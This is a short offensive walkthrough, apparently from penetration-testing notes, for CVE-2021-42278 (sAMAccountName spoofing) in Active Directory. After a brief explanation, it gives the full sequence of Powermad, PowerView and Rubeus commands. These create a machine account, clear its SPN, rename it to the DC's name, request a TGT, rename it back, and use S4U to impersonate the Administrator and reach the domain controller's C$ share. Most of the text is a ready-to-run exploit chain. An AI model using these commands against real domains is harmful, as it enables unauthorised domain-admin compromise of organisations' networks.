# CVE-2021-42278

Allows an authenticated user on the domain to add a machine to the domain with a password that we define and know.

Modify the `SamAccountName` attribute in the directory to spoof the `DC` name and then use this new machine with the DC name it is spoofing to generate a TGT saying "We are DC".

Then reset the machine name to default, this time communicate with the real DC by presenting our TGT that bears its own name, requesting a TGS and thus gaining full rights on the DC.

`Powermad.ps1` allows adding a machine to the domain and renaming the machine's SamAccountName attribute

`PowerView.ps1` allows deleting the machine's SPN

Client workstation on a domain with a local admin user

```sh
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount W10 -Domain dom.local -DomainController dc.dom.local -Verbose
```

```sh
Import-Module .\PowerView.ps1
Set-DomainObject "CN=W10,CN=Computer,DC=dom,DC=local" -Clear 'serviceprincipalname' -Verbose
```

```sh
Set-MachineAccountAttribute -MachineAccount W10 -Value "DC" -Attribute sAMAccountName -Verbose
```

```sh
Rubeus.exe asktgt /user:DC /password:Password123 /domain:dom.local /dc:dc.dom.local /nowrap
```

```sh
Set-MachineAccountAttribute -MachineAccount W10 -Value "W10" -Attribute sAMAccountName -Verbose
```

```sh
Rubeus.exe s4u /impersonateuse:Administrateur /nowrap /dc:dc.dom.local /self /altservice:CIFS/DC.dom.local /ptt /ticket:<ticket base 64>
```

```sh
klist
```

```sh
dir \\dc.dom.local\c$
```
